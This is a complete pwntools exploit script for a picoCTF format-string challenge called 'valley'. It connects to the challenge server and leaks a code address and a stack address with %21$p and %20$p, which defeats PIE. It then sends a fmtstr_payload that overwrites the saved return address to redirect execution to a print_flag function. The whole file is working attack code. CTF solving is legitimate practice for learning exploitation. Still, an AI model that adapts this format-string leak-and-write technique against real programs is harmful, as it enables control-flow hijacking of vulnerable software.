#!/usr/bin/env python3

from pwn import *

exe = ELF("./valley_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
gdb_script = '''
b main
continue
'''
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("shape-facility.picoctf.net", 55189)

    return r


def main():
    r = conn()
    offset_fmstr = 6
    offset_main_addr = 0x1413
    r.sendlineafter('Shouting:', b'%21$p')
    output = r.recvline()
    output = r.recvline()
    output = output.split(b'You heard in the distance: ')[1].strip(b'\n')
    output = int(output, 16)
    print(f"Leaked address: {hex(output)}")
    pie_base = output - offset_main_addr
    print(f"Pie base: {hex(pie_base)}")

    offset_print_flag = 0x0000000000001269
    print_flag = pie_base + offset_print_flag
    print(f"Print flag: {hex(print_flag)}")



    r.sendline(b'%20$p')
    output = r.recvline()
    output = output.split(b'You heard in the distance: ')[1].strip(b'\n')
    output = int(output, 16)
    print(f"Leaked address: {hex(output)}")

    ret_addr = output - 8
    print(f"Ret addr: {hex(ret_addr)}")


    payload = fmtstr_payload(6, {ret_addr: print_flag}, write_size='short')
    print(len(payload))
    r.sendline(payload)
    r.sendline(b'exit')
    r.interactive()


if __name__ == "__main__":
    main()

